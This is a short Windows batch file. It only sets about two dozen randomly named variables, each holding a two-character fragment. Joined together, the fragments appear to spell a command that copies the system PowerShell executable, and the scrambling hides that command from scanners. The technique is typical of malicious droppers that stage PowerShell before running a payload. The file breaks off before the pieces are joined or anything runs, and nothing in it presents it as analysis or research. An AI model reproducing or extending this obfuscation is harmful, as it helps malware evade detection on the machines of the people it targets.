@echo off
set "xkhSZAcZoA=do"
set "OmioASaXae=0\"
set "PAgjOfuXSc=Wi"
set "GykGxneAbd=Po"
set "IswPSmTwqY=in"
set "KwhsfWFYqd=ll"
set "xAXtPNODaW=we"
set "MjfNasLPLj=xe"
set "OZEPwVZtbP=1."
set "USiUyHCQyP=.e"
set "CbrslDVOxf=em"
set "YWvaxyXxDR=\W"
set "TKuQmKsvSW=co"
set "HCBDrZZBvM=he"
set "TKjwAIiHFX= C"
set "CLQUFWCtFz=ow"
set "nlOCCtYFXF=Sy"
set "RQcuVsDaHv=s\"
set "ZVKuEQimsQ=y "
set "RbqYrIphVl=\v"
set "vXidKlzfVm=rS"
set "akNYwjYeGu= /"
set "GfxMrFTbxy=rs"
set "uXjtxjAXqD=nd"
set "rhYvPCqjit=:\"
set "eAPuchakOK=py"
